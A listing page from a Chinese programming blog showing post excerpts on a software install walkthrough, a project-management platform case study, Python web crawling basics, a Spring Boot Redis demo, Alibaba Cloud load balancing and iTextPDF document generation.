https://wm.makeding.com/iclk/?zoneid=56949
3-点击我接受，点击选项进行查看。
4-安装路径默认选C盘不要去修改，然后点击继续。
5-点击安装。
6-等待。
7-点击完成。
8-打开桌面上的软件图标运行。
9-选择输入软件密钥（电脑首次安装是有30天免费试用的，需要登录账号验证后才可试用，本次教程直接以输入输入密钥举例。）
10-输入密钥，点击解锁即可。
本次讲解完毕~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f24537bcd341b1d266993f1895b15ee5/" rel="bookmark">
			案例分享 | 助力数字化转型：嘉为科技项目管理平台上线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		嘉为科技项目管理平台（一期）基于易趋（EasyTrack）进行实施，通过近一年的开发及试运行，现已成功交付上线、推广使用，取得了良好的应用效果。
1.关于广州嘉为科技有限公司（以下简称嘉为科技） 广州嘉为科技有限公司（简称“嘉为科技”）成立于2001年，公司的使命是以科技之力助企业运营更智能。作为数字研运解决方案的引领者，我们基于“嘉为蓝鲸”这个先进的一体化融合平台，为客户提供IT研发、运维、运营全领域的产品与解决方案，全面支撑政企客户数字化转型！
嘉为蓝鲸，是业界领先的数字研运解决方案品牌，结合业内先进的腾讯蓝鲸PaaS技术架构、融合嘉为科技近20年研运经验打造的一体化平台，包含：一站式研发效能解决方案DevOps 、一体化和平台化运维管理解决方案AIOps、一体化运维订阅服务产品WeOps。
嘉为科技于2019年、2021年和2023年分别获得腾讯、红杉资本和钟鼎资本的投资，在北京、上海、广州、深圳、成都、杭州、南京等地设有核心基地，运营网络辐射全国。公司先后被评为国家高新技术企业、福布斯中国科技企业50强、信通院数字化转型赋能服务集体、中国ToB行业年度创新力企业、云上软件工程社区初创成员单位、IT智能运维领军企业等。
一直以来，嘉为科技高度重视研发与创新，过去8年平均每年的研发费用投入超过总营收的30%。面向政企市场，通过与腾讯蓝鲸及工银科技等的技术合作，嘉为科技掌握了IT研发、运维及运营领域的多项核心技术和发明专利，入选Gartner市场指南，并参与了多项信通院行业标准的制定。
目前，嘉为科技的解决方案已广泛应用于政务民生、金融、能源、运营商、交通运输、汽车制造、高科技等行业超千家政企客户。未来，嘉为科技将继续开拓奋进、创新发展，持续成就客户、造福社会！
2.项目背景 在业务的迅速发展过程中，嘉为科技希望进一步为客户提供更高价值的IT运营解决方案和服务，从而产生了对项目管理软件的需求，希望借助专业的项目管理软件实现交付项目的全过程管理，同时进一步提高项目管理水平。
3.建设目标 项目管理工作全过程可视化
实现各管理层级及项目经理更灵活和直观的进行进度、成本、风险、问题、资源等多维度的管控。
项目管理工作流程化、规范化
PMO管理流程与项目计划相结合，能进行更好的管理指引。
实现各管理软件集成
统一项目管理入口，集成工作完成后，交付端可以通过PPM管理到与项目相关的信息。
进一步沉淀项目数据基底，服务于后续业务分析
4.实施效果 嘉为科技项目管理通过前期的准备和业务调研，确定采取分阶段实施的方式，主要分为两期进行建设，通过双方的良好协作，目前嘉为科技项目管理平台（一期）已经顺利交付。
4.1支撑项目全流程管理，掌握项目全面状态，过程可视化
a.流程与工具基本结合完成，主体工作已全面线上化运作。
b.已在进行的项目，已全部在PPM上运作；交付端项目经理及PMO已将PPM形成自己的工作台，系统当前运作数百个项目。
4.2实现项目健康性监管，标准化、规范化进行项目管理，数据可视化
a.项目计划与任务在系统形成管理，数据进一步沉淀并细化。
b.PMO全局项目健康性完成初期建立。
4.3实现管理软件集成，协同高效化
a.实现包含ERP、企业微信以及ITR等管理软件的集成。
5.关于易趋 易趋始终坚持自主创新，面向IT、产品研发和专业服务项目提供灵活、全面的企业级项目组合管理产品+解决方案。
覆盖组织战略决策、运营管理和项目执行三层面，一方面，通过自上而下的战略规划和项目选择，使项目与组织业务目标一致；另一方面，通过自下而上的数据采集，为管理者分析和决策提供实时客观的数据支持。覆盖项目全生命周期管理，基于业务驱动，通过项目打造数字化组织和运营模式。
经过近20年的耕耘，易趋（EasyTrack）陆续帮助深交所、广期所、邮储银行、浙江农商联合银行、工银科技、中再集团、明略科技、南天信息、京东方、海尔集团、延锋安道拓、中汽研、中国科学院、中广核、中移动、东方航空等金融、IT、高科技制造等企事业建立了组织级项目管理核心业务平台，并获得他们的一致好评，在项目管理行业取得了领先的市场地位。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c107522195fe83672a7d0431d69057bf/" rel="bookmark">
			电商API接口接入|电商爬虫实践附代码案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.爬虫是什么
首先应该弄明白一件事，就是什么是爬虫，为什么要爬虫，百度了一下，是这样解释的：网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。其实，说白了就是爬虫可以模拟浏览器的行为做你想做的事，订制化自己搜索和下载的内容，并实现自动化的操作。比如浏览器可以下载小说，但是有时候并不能批量下载，那么爬虫的功能就有用武之地了。实现爬虫技术的编程环境有很多种，Java，Python，C++等都可以用来爬虫。相信很多人选择Python，因为Python确实很适合做爬虫，丰富的第三方库十分强大，简单几行代码便可实现你想要的功能，更重要的，Python也是数据挖掘和分析的好能手。电商API数据接口，爬取数据和分析数据一条龙的服务都用Python真的感觉很棒啊！
2.学习Python爬虫的大致步骤如下：
首先学会基本的Python语法知识
学习Python爬虫常用到的几个重要内置库urllib, http等，用于下载网页
学习正则表达式re、BeautifulSoup（bs4）、Xpath（lxml）等网页解析工具
开始一些简单的网站爬取（博主从百度开始的，哈哈），了解爬取数据过程
了解爬虫的一些反爬机制，header，robot，时间间隔，代理ip，隐含字段等
学习一些特殊网站的爬取，解决登录、Cookie、动态网页等问题
了解爬虫与数据库的结合，如何将爬取数据进行储存
学习应用Python的多线程、多进程进行爬取，提高爬虫效率
学习爬虫的框架，Scrapy、PySpider等
学习分布式爬虫（数据量庞大的需求）
3. 从第一个爬虫开始 首先，在爬虫中最常见的代码便是：
import requests 即引入requests库，是一切爬虫程序的基础。在Python中，有许多库可以供我们使用。这也是Python相对于其它编程语言的一大优势。
这里要注意，如果之前没有在电脑上安装过requests库，需要先进行安装。打开命令行终端，输入 pip install requests。
在引入requests数据库后，就可以使用其中的requests.get()方法了。其具体的用法为：
有一点需要注意的事，不是所有服务器都会欢迎爬虫程序。建议大家在运行爬虫程序前先去查一下相应网站的Robots协议，了解一下哪些页面是可以抓取的。而查看Robots协议的方式也很简单，只需在网站域名后加上/robots.txt就可以了。网址前如有显示‘Allow’即为允许爬取，而带有‘Disallow’后的网址就不建议大家去抓取了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99d9f11b6906a9326fae6364eca7803e/" rel="bookmark">
			springboot集成 Redis快速入门demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、准备redis环境 这里用docker-compose来搭建Redis测试环境，采用单机模式，具体配置如下：
docker-compose-redis.yml version: '3' services: redis: image: registry.cn-hangzhou.aliyuncs.com/zhengqing/redis:6.0.8 # image 'redis:6.0.8' container_name: redis # 容器名为'redis' restart: unless-stopped # 指定容器退出后的重启策略为始终重启，但是不考虑在Docker守护进程启动时就已经停止了的容器 command: redis-server /etc/redis/redis.conf --requirepass 123456 --appendonly no # 启动redis服务并添加密码为：123456,默认不开启redis-aof方式持久化配置 # command: redis-server --requirepass 123456 --appendonly yes # 启动redis服务并添加密码为：123456,并开启redis持久化配置 environment: # 设置环境变量,相当于docker run命令中的-e TZ: Asia/Shanghai LANG: en_US.UTF-8 volumes: # 数据卷挂载路径设置,将本机目录映射到容器目录 - "./redis/data:/data" - "./redis/config/redis.conf:/etc/redis/redis.conf" # `redis.conf`文件内容`http://download.redis.io/redis-stable/redis.conf` ports: # 映射端口 - "6379:6379" 二、搭建测试工程 1.pom.xml &lt;!--redis client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99d9f11b6906a9326fae6364eca7803e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f103bd178251e410cf70627eb084101/" rel="bookmark">
			阿里云负载均衡对接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 、开通负载均衡产品
2 、ALB / NLB / CLB ALB： 应用型负载均衡 ， 给定对应服务域名与当前实例DNS绑定之后即可使用
支持： HTTP/HTTPS/QUIC等应用层流量协议
NLB： 网络型负载均衡 支持： TCP / UDP / TCPSSL
CLB：传统型负载均衡
支持: HTTPS / HTTP / TCP
以NLB为例(只用到TCP业务的负载):
创建实例: 点击创建监听: 选择服务器组: 这里重点说明一下 , 创建服务器组时要把相同端口的归为一个组 , 否则出错
点击编辑后端服务器,不同服务器相同端口,且要负载的归为一组:
设置域名解析 负责DNS名称 , 在域名解析中找到负载的域名或者添加负载域名
将记录类型: 选择为txt即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b505a376206b7c1cfedc527c606e7df/" rel="bookmark">
			在Spring Boot中使用iTextPDF创建动态PDF文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近，我们的系统新增了一个客服模块，其中一个重要功能是能够以PDF格式导出客服与用户之间的聊天记录。这些聊天记录包含文字、图片和文件等多种内容。为了实现这一功能，我们首先使用了itextpdf 5.x版本制作了一个Demo。今天，我将与家人们分享一下这项进展。
iTextPDF 介绍 iTextPDF 是一个用于创建和操作 PDF（Portable Document Format）文档的流行的 Java 库。它提供了一套全面的功能，用于处理 PDF 文件，包括创建新文档、修改现有文档以及提取信息。以下是 iTextPDF 的一些关键方面的简要概述：
文档创建： iTextPDF 允许您从头开始创建新的 PDF 文档。
您可以向文档添加段落、表格、图像和其他元素。
文本操作： 该库提供了格式化和处理文本的方法。
页面布局： 您可以定义页面的布局，包括页面尺寸、边距等。
字体和颜色： iTextPDF 允许您选择字体和颜色，以定制文档的外观。
表格： 通过 iTextPDF，您可以创建包含表格的文档，设置表格的列数、行数和单元格内容。
图像处理： 您可以将图像插入到文档中，并设置图像的大小和位置。
文档安全性： iTextPDF 提供了对文档进行加密和数字签名的功能，以增强文档的安全性。
文档解析： 除了创建文档，iTextPDF 还允许您解析现有的 PDF 文档，提取文本、图像等信息。
代码示例 我们此处使用的 iTextPDF 5.x的版本实现的
添加依赖 在pom文件中添加如下依赖
&lt;dependency&gt; &lt;groupId&gt;com.itextpdf&lt;/groupId&gt; &lt;artifactId&gt;itextpdf&lt;/artifactId&gt; &lt;version&gt;5.5.13.2&lt;/version&gt; &lt;/dependency&gt; 代码编写 service代码
import cn.xj.xjdoc.system.entity.Message; import com.alibaba.fastjson2.JSONArray; import com.alibaba.fastjson2.JSONObject; import com.itextpdf.text.*; import com.itextpdf.text.Font; import com.itextpdf.text.Image; import com.itextpdf.text.pdf.BaseFont; import com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b505a376206b7c1cfedc527c606e7df/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/3/">«</a>
	<span class="pagination__item pagination__item--current">4/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/5/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>